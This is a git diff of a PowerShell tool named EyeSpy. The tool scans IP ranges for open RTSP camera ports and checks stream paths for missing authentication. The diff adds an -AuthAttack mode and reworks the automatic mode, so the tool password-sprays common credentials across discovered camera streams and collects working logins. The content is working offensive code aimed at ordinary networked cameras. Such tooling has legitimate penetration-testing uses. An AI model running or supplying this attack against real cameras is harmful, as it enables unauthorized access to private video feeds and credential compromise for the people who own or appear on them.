@@ -5,8 +5,11 @@ function EyeSpy {
         [String]$Search,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$NoAuth,
-        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
+        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
+        #[ValidatePattern('^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}:\b((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))\b$', ErrorMessage = "Please ensure you are Entering a valid IP:Port Combination e.g. 10.0.0.1:554")]
         [String]$AuthAttack,
+        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
+        [String]$Path,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
         [String]$Auto,
         [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
@@ -17,30 +20,50 @@ function EyeSpy {
     if ($Help) {
 
         $HelpOutput = @("
-=========================================================
+========================================================================================================
                 
-=========================================================
-         _______             _______             
-        |    ___.--.--.-----|     __.-----.--.--.
-        |    ___|  |  |  -__|__     |  _  |  |  |
-        |_______|___  |_____|_______|   __|___  |
-                |_____|             |__|  |_____|   
+========================================================================================================
+                                 _______             _______             
+                                |    ___.--.--.-----|     __.-----.--.--.
+                                |    ___|  |  |  -__|__     |  _  |  |  |
+                                |_______|___  |_____|_______|   __|___  |
+                                        |_____|             |__|  |_____|   
                                 
-=========================================================
-                By: Miiden
-=========================================================
+========================================================================================================
+                                By: Miiden
+========================================================================================================
  
- Check GitHub for more detailed descriptions.
+Check GitHub for more detailed descriptions.
 
- Example Usage:
+General Usage Parameters
++---------------------+--------------+-----------------------------------------------------------------+
+| Parameter           |    Value     | Description                                                     |
++---------------------+--------------+-----------------------------------------------------------------+
+| -Search             |  IP(/Range)  | Scans the provided IP/Range for Open RTSP Ports.                |
+| -NoAuth             |  IP(/Range)  | Checks the provided IP/Range if authentication is required.     |
+| -AuthAttack         |   IP:Port    | Performs a Password spray attack on provided targets.           |
+| -Auto               |  IP(/Range)  | All of the above automatically.                                 |
+| -Help               |     N/A      | Shows this Help.                                                |
++---------------------+--------------+-----------------------------------------------------------------+
 
- EyeSpy -Search 192.168.0.1/24
+Example Usage:
 
- EyeSpy -NoAuth 192.168.0.123
+# Search for common open RTSP ports on a single IP or across a range.
+  EyeSpy -Search 192.168.0.1/24
 
- Eyespy -Auto 192.168.0.1/24
+# Searches for common open RTSP ports and checks common paths if authentication is required.
+  EyeSpy -NoAuth 192.168.0.123
+ 
+# Performs a password spraying attack with common credentials on a known open IP:Port
+EyeSpy -AuthAttack 192.168.0.123
 
-=========================================================
+# Performs a password spraying attack with common credentials on a known open IP:Port/Path
+EyeSpy -AuthAttack 192.168.0.123 -Path 'MyStream'
+
+# Performs all of the above automatically across a single IP or Range
+Eyespy -Auto 192.168.0.1/24
+
+========================================================================================================
 ")
 
         $HelpOutput | Write-Output
@@ -67,7 +90,7 @@ function EyeSpy {
     
         Write-Host
         Write-Host "[!] " -ForegroundColor "Red" -NoNewline
-        Write-Host "You must provide either -Scan or -FullAuto"
+        Write-Host "You must Use either -Search, -NoAuth, -AuthAttack or -Auto"
     
         Write-Host "[!] " -ForegroundColor "Red" -NoNewline
         Write-Host "Run ""EyeSpy -Help"" for command line usage"
@@ -76,6 +99,7 @@ function EyeSpy {
         return
     
     }
+
 
 $Banner
 
@@ -220,7 +244,9 @@ function Get-OpenRTSPPorts {
         }
         
         
-        Write-Host "`r`n=========================================================`r`n"
+        Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
+        Write-Host " Valid IP's With Open Port's Discovered.`r`n"
+        Write-Host "=========================================================`r`n"
     }
 }
 
@@ -260,7 +286,6 @@ function Get-ValidRTSPPaths {
     )
     $authRequiredPaths = @()
     
-    Write-Host "=========================================================`r`n"
     Write-Host "Checking for valid RTSP Paths:`r`n"
 
     foreach ($openPort in $OpenPorts) {
@@ -313,7 +338,10 @@ function Get-ValidRTSPPaths {
             }
         }
     }
-    Write-Host "`r`n=========================================================`r`n"
+
+    Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
+    Write-Host " Potential Paths Found!`r`n"
+    Write-Host "=========================================================`r`n"
     return $authRequiredPaths
 }
 
@@ -361,7 +389,7 @@ function Get-ValidRTSPCredential {
 
     $pathStep = 1
     $totalPaths = 1
-    $parentActivity = "Checking path $Path"
+    $parentActivity = "Checking`: $IP`:$Port/$Path"
     $parentStatus = "Starting"
     $parentId = Get-Random
 
@@ -381,18 +409,23 @@ function Get-ValidRTSPCredential {
         if ($validCred) {
             Write-Progress -Id $parentId -Activity $parentActivity -Status "Success" -PercentComplete 100 -Completed
             Write-Progress -Id $childId -Activity $childActivity -Status "Success" -PercentComplete 100 -Completed -ParentId $parentId
-            return $validCred
+
+            return [PSCustomObject]@{
+                Credential = $validCred
+                CredentialFound = $true
+            }
         } else {
             $childStatus = "Failed"
             Write-Progress -Id $childId -Activity $childActivity -Status $childStatus -PercentComplete 100 -Completed -ParentId $parentId
         }
-
-        Write-Progress -Id $parentId -Activity $parentActivity -Status $parentStatus -PercentComplete $parentProgress -CurrentOperation $childActivity -SecondsRemaining (-1)
     }
 
     Write-Progress -Id $parentId -Activity $parentActivity -Status "Failed" -PercentComplete 100 -Completed
 
-    return $null
+    return [PSCustomObject]@{
+        Credential = $null
+        CredentialFound = $false
+    }
 }
 
 function Test-RTSPAuth {
@@ -496,6 +529,96 @@ function NoAuthScan {
     Write-Host "=========================================================`r`n"
 }
 
+function AuthAttack {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory)]
+        [string]$Target,
+        [Parameter(Mandatory = $False)]
+        [string]$Path
+    )
+
+    $ipAndPort = $Target.Split(':')
+    $ip = $ipAndPort[0]
+    $port = $ipAndPort[1]
+    $cliaddress += [PSCustomObject]@{
+        IPAddress = $ip
+        Port      = $port
+        Status    = "Open"
+    }
+
+    if ($PSBoundParameters.ContainsKey('Path')) {
+        # -Path parameter is provided, create a PSCustomObject directly
+        $authRequiredPaths = [PSCustomObject]@{
+            IPAddress = $ip
+            Port      = $port
+            Path      = $Path
+        }
+    }
+    else {
+        # -Path parameter is not provided, use the default behavior
+        $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $cliaddress
+    }
+
+    $credentials = GenerateCreds
+
+    $validCredentials = @()
+
+    if ($authRequiredPaths -is [System.Array]) {
+        if ($authRequiredPaths.Count -gt 0) {
+            Write-Host "=========================================================`r`n"
+            Write-Host "Beginning Password Spray:`r`n"
+
+            $index = 0
+            while ($index -lt $authRequiredPaths.Count) {
+                $authPath = $authRequiredPaths[$index]
+                $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -Credentials $credentials
+
+                if ($result.CredentialFound) {
+                    $validCredentials += [PSCustomObject]@{
+                        IPAddress   = $authPath.IPAddress
+                        Port        = $authPath.Port
+                        Path        = $authPath.Path
+                        Credentials = $result.Credential
+                    }
+
+                    # Remove the current IP:Port combination from the array
+                    $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }
+                }
+                else {
+                    $index++
+                }
+            }
+
+            return $validCredentials
+        }
+    } elseif ($null -eq $authRequiredPaths) {
+
+        Write-Host -NoNewline -ForegroundColor Green "[+]"
+        Write-Host " No Auth Detected, See results above.`r`n"
+
+    } else {
+        # $authRequiredPaths is a single object, handle it separately
+        Write-Host "Beginning Password Spray:`r`n"
+
+        $result = Get-ValidRTSPCredential -IP $authRequiredPaths.IPAddress -Port $authRequiredPaths.Port -Path $authRequiredPaths.Path -Credentials $credentials
+
+        if ($result.CredentialFound) {
+            $validCredentials += [PSCustomObject]@{
+                IPAddress   = $authRequiredPaths.IPAddress
+                Port        = $authRequiredPaths.Port
+                Path        = $authRequiredPaths.Path
+                Credentials = $result.Credential
+            }
+
+            return $validCredentials
+        }
+    }
+
+    Write-Host "Scan completed.`r`n" -ForegroundColor Green
+    Write-Host "=========================================================`r`n"
+}
+
 function FullAuto {
     [CmdletBinding()]
     param (
@@ -506,43 +629,44 @@ function FullAuto {
     $ipRange = Get-IpRange -Target $Targets
     $openPorts = Get-OpenRTSPPorts -IPAddress $ipRange
     $authRequiredPaths = Get-ValidRTSPPaths -OpenPorts $openPorts
+    $credentials = GenerateCreds
+    $validCredentials = @()
 
     if ($authRequiredPaths.Count -gt 0) {
-        $credentials = GenerateCreds
-        $validCredentials = @()
 
-        Write-Host "=========================================================`r`n"
         Write-Host "Beginning Password Spray:`r`n"
 
-        foreach ($authPath in $authRequiredPaths) {
-            $validCredFound = $false
+        $index = 0
+        while ($index -lt $authRequiredPaths.Count) {
+            $authPath = $authRequiredPaths[$index]
+            $result = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -Credentials $credentials
 
-            $validCred = Get-ValidRTSPCredential -IP $authPath.IPAddress -Port $authPath.Port -Path $authPath.Path -Credentials $credentials
-
-            if ($validCred) {
+            if ($result.CredentialFound) {
                 $validCredentials += [PSCustomObject]@{
                     IPAddress   = $authPath.IPAddress
                     Port        = $authPath.Port
                     Path        = $authPath.Path
-                    Credentials = $validCred
+                    Credentials = $result.Credential
                 }
-                $validCredFound = $true
-            }
 
-            if ($validCredFound) {
-                break
+                # Remove the current IP:Port combination from the array
+                $authRequiredPaths = $authRequiredPaths | Where-Object { ($_.IPAddress -ne $authPath.IPAddress) -or ($_.Port -ne $authPath.Port) }
+
+            } else {
+                $index++
             }
         }
+        Write-Host -ForegroundColor Green -NoNewline "[+]"
+        Write-Host " Found Credentials: " 
 
         return $validCredentials
+
     }
     else {
-        
         Write-Host "=========================================================`r`n"
         Write-Host "No authentication required, see results above.`r`n"
         Write-Host "Scan completed.`r`n" -ForegroundColor Green
         Write-Host "=========================================================`r`n"
-
     }
 }
 
@@ -554,11 +678,25 @@ if ($Search) {
 
     NoAuthScan -Targets $NoAuth
 
+} elseif ($AuthAttack){
+
+    if ($AuthAttack -match  '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}:\b((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))\b$') {
+        if ($Path) {
+            AuthAttack -Target $AuthAttack -Path $Path
+        } else {
+            AuthAttack -Target $AuthAttack
+    }
+    
+    } else {
+     Write-Host -NoNewline -ForegroundColor Red "[-]"
+     Write-Host " Please ensure you are entering a valid IP:Port combination e.g. 10.0.0.1:554"
+
+    }  
+ 
 } elseif ($Auto){
 
     FullAuto -Targets $Auto
 
 } 
-
 
 }
